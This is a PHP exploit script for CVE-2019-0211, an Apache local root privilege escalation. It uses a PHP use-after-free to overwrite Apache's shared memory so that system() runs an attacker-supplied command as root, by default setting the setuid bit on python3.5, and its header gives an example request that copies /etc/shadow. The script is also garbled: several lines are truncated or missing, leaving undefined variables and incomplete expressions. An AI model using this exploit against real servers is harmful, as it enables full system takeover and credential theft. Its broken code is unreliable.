# CARPE (DIEM): CVE-2019-0211 Apache Root Privilege Escalation
# Charles Fol
# @cfreal_
#
# INFOS
#
# https://cfreal.github.io/carpe-diem-cve-2019-0211-apache-local-root.html
#
# USAGE
#
# 1. Upload exploit to Apache HTTP server
# 2. Send request to page
# 3. Await 6:25AM for logrotate to restart Apache
# 4. python3.5 is now suid 0
#
# You can change the command that is ran as root using the cmd HTTP
# parameter (GET/POST).
# Example: curl http://localhost/carpediem.php?cmd=cp+/etc/shadow+/tmp/
#
# SUCCESS RATE
#
# Number of successful and failed exploitations relative to of the number
# of MPM workers (i.e. Apache subprocesses). YMMV.
#
# W  --% S   F
#  5 87% 177 26 (default)
#  8 89%  60  8
# 10 95%  70  4
#
# More workers, higher success rate.
# By default (5 workers), 87% success rate. With huge HTTPds, close to 100%.
# Generally, failure is due to all_buckets being relocated too far from its
# original address.
#
# TESTED ON
#
# - Apache/2.4.25
# - PHP 7.2.12
# - Debian GNU/Linux 9.6
#
# TESTING
#
# $ curl http://localhost/cfreal-carpediem.php
# $ sudo /usr/sbin/logrotate /etc/logrotate.conf --force
# $ ls -alh /usr/bin/python3.5
# -rwsr-sr-x 2 root root 4.6M Sep 27  2018 /usr/bin/python3.5
#
# There are no hardcoded addresses.
# - Addresses read through /proc/self/mem
# - Offsets read through ELF parsing
#
# As usual, there are tons of comments.
#


o(&#039;CARPE (DIEM) ~ CVE-2019-0211&#039;);
o(&#039;&#039;);

error_reporting(E_ALL);


# Starts the exploit by triggering the UAF.
function real()
{
	global $y;
	$y = [new Z()];
	json_encode([0 => &$y]);
}

# In order to read/write what comes after in memory, we need to UAF a string so
# that we can control its size and make in-place edition.
# An easy way to do that is to replace the string by a timelib_rel_time
# structure of which the first bytes can be reached by the (y, m, d, h, i, s)
# properties of the DateInterval object.
#
# Steps:
# - Create a base object (Z)
# - Add string property (abc) so that sizeof(abc) = sizeof(timelib_rel_time)
# - Create DateInterval object ($place) meant to be unset and filled by another
# - Trigger the UAF by unsetting $y[0], which is still reachable using $this
# - Unset $place: at this point, if we create a new DateInterval object, it will
#   replace $place in memory
# - Create a string ($holder) that fills $place&#039;s timelib_rel_time structure
# - Allocate a new DateInterval object: its timelib_rel_time structure will
#   end up in place of abc
# - Now we can control $this->abc&#039;s zend_string structure entirely using
#   y, m, d etc.
# - Increase abc&#039;s size so that we can read/write memory that comes after it,
#   especially the shared memory block
# - Find out all_buckets&#039; position by finding a memory region that matches the
#   mutex->meth structure
# - Compute the bucket index required to reach the SHM and get an arbitrary
#   function call
# - Scan ap_scoreboard_image->parent[] to find workers&#039; PID and replace the
#   bucket
class Z implements JsonSerializable
{
	public function jsonSerialize()
	{
		global $y, $addresses, $workers_pids;

		#
		# Setup memory
		#
        o(&#039;Triggering UAF&#039;);
		o(&#039;  Creating room and filling empty spaces&#039;);

		# Fill empty blocks to make sure our allocations will be contiguous
		# I: Since a lot of allocations/deallocations happen before the script
		# is ran, two variables instanciated at the same time might not be
		# contiguous: this can be a problem for a lot of reasons.
		# To avoid this, we instanciate several DateInterval objects. These
		# objects will fill a lot of potentially non-contiguous memory blocks,
		# ensuring we get "fresh memory" in upcoming allocations.
		$contiguous = [];
		for($i=0;$i<10;$i++)
			$contiguous[] = new DateInterval(&#039;PT1S&#039;);

		# Create some space for our UAF blocks not to get overwritten
		# I: A PHP object is a combination of a lot of structures, such as
		# zval, zend_object, zend_object_handlers, zend_string, etc., which are
		# all allocated, and freed when the object is destroyed.
		# After the UAF is triggered on the object, all the structures that are
		# If we create other variables afterwards, those variables might be
		# problems for the rest of the exploitation.
		# To avoid this, we allocate a lot of objects before the UAF, and free
		# them afterwards. Since PHP&#039;s heap is LIFO, when we create other vars,
		# they will take the place of those objects instead of the object we
		# are triggering the UAF on. This means our object is "shielded" and
		# we don&#039;t have to worry about breaking it.
		$room = [];
		for($i=0;$i<10;$i++)
			$room[] = new Z();

		# Build string meant to fill old DateInterval&#039;s timelib_rel_time
		# I: ptr2str&#039;s name is unintuitive here: we just want to allocate a
		# zend_string of size 78.
		$_protector = ptr2str(0, 78);

		o(&#039;  Allocating $abc and $p&#039;);

		# Create ABC
		# I: This is the variable we will use to R/W memory afterwards.
		# After we free the Z object, we&#039;ll make sure abc is overwritten by a
		# timelib_rel_time structure under our control. The first 8*8 = 64 bytes
		# of this structure can be modified easily, meaning we can change the
		# size of abc. This will allow us to read/write memory after abc.
		$this->abc = ptr2str(0, 79);

		# Create $p meant to protect $this&#039;s blocks
		# I: Right after we trigger the UAF, we will unset $p.
		# This means that the timelib_rel_time structure (TRT) of this object
		# will be freed. We will then allocate a string ($protector) of the same
		# size as TRT. Since PHP&#039;s heap is LIFO, the string will take the place
		# of the now-freed TRT in memory.
		# Then, we create a new DateInterval object ($x). From the same
		# assumption, every structure constituting this new object will take the
		# block has already been replaced by $protector, the new TRT will be put
		# in the next free blocks of the same size, which happens to be $abc
		# (remember, |abc| == |timelib_rel_time|).
		# We now have the following situation: $x is a DateInterval object whose
		# internal TRT structure has the same address as $abc&#039;s zend_string.
		$p = new DateInterval(&#039;PT1S&#039;);

		#
		# Trigger UAF
		#
		
		o(&#039;  Unsetting both variables and setting $protector&#039;);
		# UAF here, $this is usable despite being freed
		unset($y[0]);
		# Protect $this&#039;s freed blocks
		unset($p);

		# Protect $p&#039;s timelib_rel_time structure
		$protector = ".$_protector";
		# !!! This is only required for apache
		# Got no idea as to why there is an extra deallocation (?)
		$room[] = "!$_protector";

		o(&#039;  Creating DateInterval object&#039;);
		# After this line:
		# &((php_interval_obj) x).timelib_rel_time == ((zval) abc).value.str
		# We can control the structure of $this->abc and therefore read/write
		# anything that comes after it in memory by changing its size and
		# making in-place edits using $this->abc[$position] = $char
		$x = new DateInterval(&#039;PT1S&#039;);
		# zend_string.refcount = 0
		# It will get incremented at some point, and if it is > 1,
		# zend_assign_to_string_offset() will try to duplicate it before making
		# the in-place replacement
		$x->y = 0x00;
		# zend_string.len
		$x->d = 0x100;
		# zend_string.val[0-4]
		$x->h = 0x13121110;

		# Verify UAF was successful
		# We modified stuff via $x; they should be visible by $this->abc, since
		# they are at the same memory location.
		if(!(
			strlen($this->abc) === $x->d &&
			$this->abc[0] == "\x10" &&
			$this->abc[1] == "\x11" &&
			$this->abc[2] == "\x12" &&
			$this->abc[3] == "\x13"
		))
		{
			o(&#039;UAF failed, exiting.&#039;);
			exit();
		}
		o(&#039;UAF successful.&#039;);
		o(&#039;&#039;);

		# Give us some room
		# I: As indicated before, just unset a lot of stuff so that next allocs
		# don&#039;t break our fragile UAFd structure.
		unset($room);

		#
		# Setup the R/W primitive
		#

		# We control $abc&#039;s internal zend_string structure, therefore we can R/W
		# the shared memory block (SHM), but for that we need to know the
		# position of $abc in memory
		# I: We know the absolute position of the SHM, so we need to need abc&#039;s
		# as well, otherwise we cannot compute the offset

		# Assuming the allocation was contiguous, memory looks like this, with
		# 0x70-sized fastbins:
		# 	[zend_string:abc]
		# 	[zend_string:protector]
		# 	[FREE#1]
		# 	[FREE#2]
		# Therefore, the address of the 2nd free block is in the first 8 bytes
		# of the first block: 0x70 * 2 - 24
		$address = str2ptr($this->abc, 0x70 * 2 - 24);
		# The address we got points to FREE#2, hence we&#039;re |block| * 3 higher in
		# memory
		$address = $address - 0x70 * 3;
		# The beginning of the string is 24 bytes after its origin
		$address = $address + 24;
		o(&#039;Address of $abc: 0x&#039; . dechex($address));
		o(&#039;&#039;);

		# Compute the size required for our string to include the whole SHM and
		# apache&#039;s memory region
		$distance = 
			max($addresses[&#039;apache&#039;][1], $addresses[&#039;shm&#039;][1]) -
			$address
		;
		$x->d = $distance;

		# We can now read/write in the whole SHM and apache&#039;s memory region.

		#
		# Find all_buckets in memory
		#

		# We are looking for a structure s.t.
		# |all_buckets, mutex| = 0x10
		# |mutex, meth| = 0x8
		# all_buckets is in apache&#039;s memory region
		# mutex is in apache&#039;s memory region
		# meth is in libaprR&#039;s memory region
		# meth&#039;s function pointers are in libaprX&#039;s memory region
		o(&#039;Looking for all_buckets in memory&#039;);
		$all_buckets = 0;

		for(
			$i = $addresses[&#039;apache&#039;][0] + 0x10;
			$i < $addresses[&#039;apache&#039;][1] - 0x08;
			$i += 8
		)
		{
			# mutex
			$mutex = $pointer = str2ptr($this->abc, $i - $address);
			if(!in($pointer, $addresses[&#039;apache&#039;]))
				continue;


			# meth
			$meth = $pointer = str2ptr($this->abc, $pointer + 0x8 - $address);
			if(!in($pointer, $addresses[&#039;libaprR&#039;]))
				continue;

			o(&#039;  [&mutex]: 0x&#039; . dechex($i));
			o(&#039;    [mutex]: 0x&#039; . dechex($mutex));
			o(&#039;      [meth]: 0x&#039; . dechex($meth));


			# meth->*
			# flags
			if(str2ptr($this->abc, $pointer - $address) != 0)
				continue;
			# methods
			for($j=0;$j<7;$j++)
			{
				$m = str2ptr($this->abc, $pointer + 0x8 + $j * 8 - $address);
				if(!in($m, $addresses[&#039;libaprX&#039;]))
					continue 2;
				o(&#039;        [*]: 0x&#039; . dechex($m));
			}

			$all_buckets = $i - 0x10;
			o(&#039;all_buckets = 0x&#039; . dechex($all_buckets));
			break;
		}

		if(!$all_buckets)
		{
			o(&#039;Unable to find all_buckets&#039;);
			exit();
		}

		o(&#039;&#039;);

		# The address of all_buckets will change when apache is gracefully
		# restarted. This is a problem because we need to know all_buckets&#039;s
		# address in order to make all_buckets[some_index] point to a memory
		# region we control.

		#
		# Compute potential bucket indexes and their addresses
		#

        o(&#039;Computing potential bucket indexes and addresses&#039;);

		# Since we have sizeof($workers_pid) MPM workers, we can fill the rest
		# of the ap_score_image->servers items, so 256 - sizeof($workers_pids),
		# with data we like. We keep the one at the top to store our payload.
		# The rest is sprayed with the address of our payload.

		$size_worker_score = 264;
		# I get strange errors if I use every "free" item, so I leave twice as
		# many items free. I&#039;m guessing upon startup some
		$spray_size = $size_worker_score * (256 - sizeof($workers_pids) * 2);
		$spray_max = $addresses[&#039;shm&#039;][1];
		$spray_min = $spray_max - $spray_size;

		$spray_middle = (int) (($spray_min + $spray_max) / 2);
		$bucket_index_middle = (int) (
			- ($all_buckets - $spray_middle) /
		);

		#
		# Build payload
		#

		# A worker_score structure was kept empty to put our payload in
		$payload_start = $spray_min - $size_worker_score;

		$z = ptr2str(0);

    	# Payload maxsize 264 - 112 = 152
		# Offset 8 cannot be 0, but other than this you can type whatever
		# command you want
    	$bucket = isset($_REQUEST[&#039;cmd&#039;]) ?
    		$_REQUEST[&#039;cmd&#039;] :
    		"chmod +s /usr/bin/python3.5";

    	if(strlen($bucket) > $size_worker_score - 112)
		{
			o(
				&#039;Payload size is bigger than available space (&#039; .
				($size_worker_score - 112) .
				&#039;), exiting.&#039;
			);
			exit();
		}
    	# Align
    	$bucket = str_pad($bucket, $size_worker_score - 112, "\x00");

    	# apr_proc_mutex_unix_lock_methods_t
		$meth = 
		    $z .
		    $z .
		    $z .
		    $z .
		    $z .
		    $z .
			# child_init
		    ptr2str($addresses[&#039;zend_object_std_dtor&#039;])
		;

		# The second pointer points to meth, and is used before reaching the
		# arbitrary function call
		# The third one and the last one are both used by the function call
		# zend_object_std_dtor(object) => ... => system(&arData[0]->val)
		$properties = 
			# refcount
			ptr2str(1) .
			# u-nTableMask meth
			ptr2str($payload_start + strlen($bucket)) .
			# Bucket arData
			ptr2str($payload_start) .
			# uint32_t nNumUsed;
			ptr2str(1, 4) .
		    # uint32_t nNumOfElements;
			ptr2str(0, 4) .
			# uint32_t nTableSize
			ptr2str(0, 4) .
			# uint32_t nInternalPointer
			ptr2str(0, 4) .
			# zend_long nNextFreeElement
			$z .
			# dtor_func_t pDestructor
			ptr2str($addresses[&#039;system&#039;])
		;

		$payload =
			$bucket .
			$meth .
			$properties
		;

		# Write the payload

		o(&#039;Placing payload at address 0x&#039; . dechex($payload_start));

		$p = $payload_start - $address;
		for(
			$i = 0;
			$i < strlen($payload);
			$i++
		)
		{
			$this->abc[$p+$i] = $payload[$i];
		}

		# Fill the spray area with a pointer to properties
		
		$properties_address = $payload_start + strlen($bucket) + strlen($meth);
		o(&#039;Spraying pointer&#039;);
		o(&#039;  Address: 0x&#039; . dechex($properties_address));
		o(&#039;  From: 0x&#039; . dechex($spray_min));
		o(&#039;  To: 0x&#039; . dechex($spray_max));
		o(&#039;  Size: 0x&#039; . dechex($spray_size));
		o(&#039;  Covered: 0x&#039; . dechex($spray_size * count($workers_pids)));
		o(&#039;  Apache: 0x&#039; . dechex(
			$addresses[&#039;apache&#039;][1] -
			$addresses[&#039;apache&#039;][0]
		));

		$s_properties_address = ptr2str($properties_address);

		for(
			$i = $spray_min;
			$i < $spray_max;
			$i++
		)
		{
			$this->abc[$i - $address] = $s_properties_address[$i % 8];
		}
		o(&#039;&#039;);

		# Find workers PID in the SHM: it indicates the beginning of their
		# process_score structure. We can then change process_score.bucket to
		# the index we computed. When apache reboots, it will use
		# all_buckets[ap_scoreboard_image->parent[i]->bucket]->mutex
		# which means we control the whole apr_proc_mutex_t structure.
		# This structure contains pointers to multiple functions, especially
		# mutex->meth->child_init(), which will be called before privileges
		# are dropped.
		# We do this for every worker PID, incrementing the bucket index so that
		# we cover a bigger range.
		
		o(&#039;Iterating in SHM to find PIDs...&#039;);

		# Number of bucket indexes covered by our spray
		# Number of bucket indexes covered by our spray and the PS structures
		$total_nb_buckets = $spray_nb_buckets * count($workers_pids);
		# First bucket index to handle
		$bucket_index = $bucket_index_middle - (int) ($total_nb_buckets / 2);

		# Iterate over every process_score structure until we find every PID or
		# we reach the end of the SHM
		for(
			$p = $addresses[&#039;shm&#039;][0] + 0x20;
			$p < $addresses[&#039;shm&#039;][1] && count($workers_pids) > 0;
			$p += 0x24
		)
		{
			$l = $p - $address;
			$current_pid = str2ptr($this->abc, $l, 4);
			o(&#039;Got PID: &#039; . $current_pid);
			# The PID matches one of the workers
			if(in_array($current_pid, $workers_pids))
			{
				unset($workers_pids[$current_pid]);
				o(&#039;  PID matches&#039;);
				# Update bucket address
				$s_bucket_index = pack(&#039;l&#039;, $bucket_index);
				$this->abc[$l + 0x20] = $s_bucket_index[0];
				$this->abc[$l + 0x21] = $s_bucket_index[1];
				$this->abc[$l + 0x22] = $s_bucket_index[2];
				$this->abc[$l + 0x23] = $s_bucket_index[3];
				o(&#039;  Changed bucket value to &#039; . $bucket_index);
				o(&#039;  Ranges: 0x&#039; . dechex($min) . &#039; - 0x&#039; . dechex($max));
				# This bucket range is covered, go to the next one
				$bucket_index += $spray_nb_buckets;
			}
		}

		if(count($workers_pids) > 0)
		{
			o(
				&#039;Unable to find PIDs &#039; .
				implode(&#039;, &#039;, $workers_pids) .
				&#039; in SHM, exiting.&#039;
			);
			exit();
		}

		o(&#039;&#039;);
		o(&#039;EXPLOIT SUCCESSFUL.&#039;);
		o(&#039;Await 6:25AM.&#039;);
		
		return 0;
	}
}

function o($msg)
{
	# No concatenation -> no string allocation
	print($msg);
	print("\n");
}

function ptr2str($ptr, $m=8)
{
	$out = "";
    for ($i=0; $i<$m; $i++)
    {
        $out .= chr($ptr & 0xff);
        $ptr >>= 8;
    }
    return $out;
}

function str2ptr(&$str, $p, $s=8)
{
	$address = 0;
	for($j=$s-1;$j>=0;$j--)
	{
		$address <<= 8;
		$address |= ord($str[$p+$j]);
	}
	return $address;
}

function in($i, $range)
{
	return $i >= $range[0] && $i < $range[1];
}

/**
 * Finds the offset of a symbol in a file.
 */
function find_symbol($file, $symbol)
{
    $elf = file_get_contents($file);
    $e_shoff = str2ptr($elf, 0x28);
    $e_shentsize = str2ptr($elf, 0x3a, 2);
    $e_shnum = str2ptr($elf, 0x3c, 2);

    $dynsym_off = 0;
    $dynsym_sz = 0;
    $dynstr_off = 0;

    for($i=0;$i<$e_shnum;$i++)
    {
        $offset = $e_shoff + $i * $e_shentsize;
        $sh_type = str2ptr($elf, $offset + 0x04, 4);

        $SHT_DYNSYM = 11;
        $SHT_SYMTAB = 2;
        $SHT_STRTAB = 3;

        switch($sh_type)
        {
            case $SHT_DYNSYM:
                $dynsym_off = str2ptr($elf, $offset + 0x18, 8);
                $dynsym_sz = str2ptr($elf, $offset + 0x20, 8);
                break;
            case $SHT_STRTAB:
            case $SHT_SYMTAB:
                if(!$dynstr_off)
                    $dynstr_off = str2ptr($elf, $offset + 0x18, 8);
                break;
        }

    }

    if(!($dynsym_off && $dynsym_sz && $dynstr_off))
        exit(&#039;.&#039;);

    $sizeof_Elf64_Sym = 0x18;

    for($i=0;$i * $sizeof_Elf64_Sym < $dynsym_sz;$i++)
    {
        $offset = $dynsym_off + $i * $sizeof_Elf64_Sym;
        $st_name = str2ptr($elf, $offset, 4);
        
        if(!$st_name)
            continue;
        
        $offset_string = $dynstr_off + $st_name;
        $end = strpos($elf, "\x00", $offset_string) - $offset_string;
        $string = substr($elf, $offset_string, $end);

        if($string == $symbol)
        {
            $st_value = str2ptr($elf, $offset + 0x8, 8);
            return $st_value;
        }
    }

    die(&#039;Unable to find symbol &#039; . $symbol);
}

# Obtains the addresses of the shared memory block and some functions through 
# /proc/self/maps
# This is hacky as hell.
function get_all_addresses()
{
	$addresses = [];
	$data = file_get_contents(&#039;/proc/self/maps&#039;);
	$follows_shm = false;

	foreach(explode("\n", $data) as $line)
	{
		if(!isset($addresses[&#039;shm&#039;]) && strpos($line, &#039;/dev/zero&#039;))
		{
            $line = explode(&#039; &#039;, $line)[0];
            $bounds = array_map(&#039;hexdec&#039;, explode(&#039;-&#039;, $line));
            if ($bounds[1] - $bounds[0] == 0x14000)
            {
                $addresses[&#039;shm&#039;] = $bounds;
                $follows_shm = true;
            }
        }
		if(
			strpos($line, &#039;r-xp&#039;)
		)
		{
			$offset = find_symbol($matches[1], &#039;system&#039;);
			$line = explode(&#039; &#039;, $line)[0];
			$line = hexdec(explode(&#039;-&#039;, $line)[0]);
			$addresses[&#039;system&#039;] = $line + $offset;
		}
		if(
			strpos($line, &#039;libapr-1.so&#039;) &&
			strpos($line, &#039;r-xp&#039;)
		)
		{
			$line = explode(&#039; &#039;, $line)[0];
			$bounds = array_map(&#039;hexdec&#039;, explode(&#039;-&#039;, $line));
			$addresses[&#039;libaprX&#039;] = $bounds;
		}
		if(
			strpos($line, &#039;libapr-1.so&#039;) &&
			strpos($line, &#039;r--p&#039;)
		)
		{
			$line = explode(&#039; &#039;, $line)[0];
			$bounds = array_map(&#039;hexdec&#039;, explode(&#039;-&#039;, $line));
			$addresses[&#039;libaprR&#039;] = $bounds;
		}
		# Apache&#039;s memory block is between the SHM and ld.so
		# Sometimes some rwx region gets mapped; all_buckets cannot be in there
		# but we include it anyways for the sake of simplicity
		if(
			(
				strpos($line, &#039;rw-p&#039;) ||
				strpos($line, &#039;rwxp&#039;)
			) &&
            $follows_shm
		)
		{
            if(strpos($line, &#039;/lib&#039;))
            {
                $follows_shm = false;
                continue;
            }
			$line = explode(&#039; &#039;, $line)[0];
			$bounds = array_map(&#039;hexdec&#039;, explode(&#039;-&#039;, $line));
			if(!array_key_exists(&#039;apache&#039;, $addresses))
			    $addresses[&#039;apache&#039;] = $bounds;
			else if($addresses[&#039;apache&#039;][1] == $bounds[0])
                $addresses[&#039;apache&#039;][1] = $bounds[1];
			else
                $follows_shm = false;
		}
		if(
			strpos($line, &#039;r-xp&#039;)
		)
		{
			$offset = find_symbol($matches[1], &#039;zend_object_std_dtor&#039;);
			$line = explode(&#039; &#039;, $line)[0];
			$line = hexdec(explode(&#039;-&#039;, $line)[0]);
			$addresses[&#039;zend_object_std_dtor&#039;] = $line + $offset;
		}
	}

	$expected = [
		&#039;shm&#039;, &#039;system&#039;, &#039;libaprR&#039;, &#039;libaprX&#039;, &#039;apache&#039;, &#039;zend_object_std_dtor&#039;
	];
	$missing = array_diff($expected, array_keys($addresses));

	if($missing)
	{
		o(
			&#039;The following addresses were not determined by parsing &#039; .
			&#039;/proc/self/maps: &#039; . implode(&#039;, &#039;, $missing)
		);
		exit(0);
	}


	o(&#039;PID: &#039; . getmypid());
	o(&#039;Fetching addresses&#039;);

	foreach($addresses as $k => $a)
	{
		if(!is_array($a))
			$a = [$a];
		o(&#039;  &#039; . $k . &#039;: &#039; . implode(&#039;-0x&#039;, array_map(function($z) {
				return &#039;0x&#039; . dechex($z);
		}, $a)));
	}
	o(&#039;&#039;);

	return $addresses;
}

# Extracts PIDs of apache workers using /proc/*/cmdline and /proc/*/status,
# matching the cmdline and the UID
function get_workers_pids()
{
	o(&#039;Obtaining apache workers PIDs&#039;);
	$pids = [];
	$cmd = file_get_contents(&#039;/proc/self/cmdline&#039;);
	$processes = glob(&#039;/proc/*&#039;);
	foreach($processes as $process)
	{
			continue;
		$pid = (int) $match[1];
		if(
			!is_readable($process . &#039;/cmdline&#039;) ||
			!is_readable($process . &#039;/status&#039;)
		)
			continue;
		if($cmd !== file_get_contents($process . &#039;/cmdline&#039;))
			continue;

		$status = file_get_contents($process . &#039;/status&#039;);
		foreach(explode("\n", $status) as $line)
		{
			if(
				strpos($line, &#039;Uid:&#039;) === 0 &&
			)
			{
				o(&#039;  Found apache worker: &#039; . $pid);
				$pids[$pid] = $pid;
				break;
			}

		}
	}
	
	o(&#039;Got &#039; . sizeof($pids) . &#039; PIDs.&#039;);
	o(&#039;&#039;);

	return $pids;
}

$addresses = get_all_addresses();
$workers_pids = get_workers_pids();
real();

